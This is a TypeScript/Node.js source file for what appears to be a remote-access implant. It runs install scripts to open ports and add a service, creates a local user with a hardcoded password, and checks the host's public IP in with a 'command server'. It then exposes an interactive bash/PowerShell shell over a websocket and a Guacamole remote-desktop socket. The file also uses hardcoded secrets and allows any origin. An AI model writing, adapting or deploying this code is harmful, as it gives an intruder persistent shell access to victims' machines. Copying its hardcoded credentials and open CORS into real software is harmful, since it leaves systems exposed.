import express from "express";
import http from "http";
import os from "os";
import * as pty from "node-pty";
import { Server, Socket } from "socket.io";
import fs from 'fs';
import jwt from 'jsonwebtoken';
import axios from 'axios';
import { createUser, runBashScript, runPowershellScript, userExists } from "./functions/install.js";

const GuacamoleLite = require('guacamole-lite');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
	// TODO: get from env
	cors: {
		origin: "*",
		methods: ["GET", "POST"],
	},
});


const guacWebsocketOptions = {
	port: 1314
}

const guacdOptions = {
	port: 4822
}

// TODO: Get from env file
const GuacClientOptions = {
	crypt: {
    	cypher: 'AES-256-CBC',
    	key: 'MySuperSecretKeyForParamsToken12'
	}
}

// Install guacd, open ports, create service, add user
if (os.platform() === 'win32') {
	runPowershellScript();
} else {
	runBashScript();
}

const username = 'samsepi0l'; // TODO: change to env for prod
const password = 'H@ck3rm@n'; // TODO: change to env for prod

userExists(username).then((exists) => {
	if (!exists) {
		createUser(username, password);
	}
});


// Check public IP into commmand server
fs.access('.checkin-complete', fs.constants.F_OK, async (err) => {
	if (err) {
		// Get JWT
		axios.get('http://127.0.0.1:3000/generate-jwt?username=' + username + '&password=' + password).then((token) => {
			// Checkin
			import('public-ip').then((publicIp) => {
				publicIp.publicIpv4().then(ip => {
					axios.get('http://127.0.0.1:3000/ip?ip='+ip + '&token=' + token)
						.then(response => {
							//Create file to prevent checkin on next run
							fs.writeFile('.checkin-complete', '', (error) => { 
								if (error) {
									//TODO: log for real
									console.log(error);
								}
							});
						})
						.catch(error => {
							// TODO: log error
							console.log(error);
						});
				}).catch(error => {
						//TODO: log error
						console.log(error);
				});
			});
		})
	}
});






// Serve websocket shell
io.on("connection", (socket: Socket) => {
	const jwtSecret = 'H@ck3rm@nI5G0!nGT0H@ckTh3W0rld@nD@llTh3R3s0urc3s@r3M1n3N0w'; // TODO: get from env
	const token = socket.handshake.query.token;

	try {
		const decodedToken = jwt.verify(token as string, jwtSecret);

		if (!decodedToken) {
			socket.disconnect();
		}

		const shell = os.platform() === "win32" ? "powershell.exe" : "bash";

		const ptyProcess = pty.spawn(shell, [], {
			name: "xterm-color",
			cols: 80,
			rows: 24,
			cwd: process.env.HOME,
			env: Object.assign(process.env),
		});

		socket.on("input", (input) => {
			ptyProcess.write(input);
		});

		ptyProcess.onData((data: any) => {
			socket.emit("output", data);
		});

		socket.on("disconnect", () => {
			ptyProcess.kill();
		});
	} catch (error) {
		socket.disconnect();
	}
});



server.listen('1313', () => {
	// TODO: log for real
	console.log("Server listening on port: " + 1313);
});


// Serve websocket for guacamole
const guacServer = new GuacamoleLite(guacWebsocketOptions, guacdOptions, GuacClientOptions);
